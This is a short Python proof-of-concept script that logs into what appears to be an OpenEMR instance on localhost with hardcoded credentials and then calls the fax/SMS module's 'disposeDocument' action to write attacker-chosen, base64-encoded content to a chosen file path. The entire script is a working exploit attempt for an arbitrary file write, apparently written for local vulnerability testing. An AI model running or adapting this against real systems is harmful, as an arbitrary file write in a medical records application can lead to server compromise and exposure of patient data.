import requests
import base64

target = "http://localhost:8080"
site = "default"
user = "NIU"
password = "Niu123@rezwan"
file_path = "/tmp/niu_write_test.txt"
content = "hello from NIU write test"

s = requests.Session()

# Step 1: log in (same as before)
s.get(f"{target}/interface/login/login.php", params={"site": site})
s.post(f"{target}/interface/main/main_screen.php",
       params={"auth": "login", "site": site},
       data={
           "new_login_session_management": "1",
           "authProvider": "Default",
           "authUser": user,
           "clearPass": password,
           "languageChoice": "1",
       })

# Step 2: attempt the write action (action=setup, not action=download this time)
encoded = base64.b64encode(content.encode()).decode()
r = s.get(f"{target}/interface/modules/custom_modules/oe-module-faxsms/index.php",
          params={
              "site": site,
              "type": "fax",
              "_ACTION_COMMAND": "disposeDocument",
              "file_path": file_path,
              "action": "setup",
              "content": encoded,
          })

print(r.text)
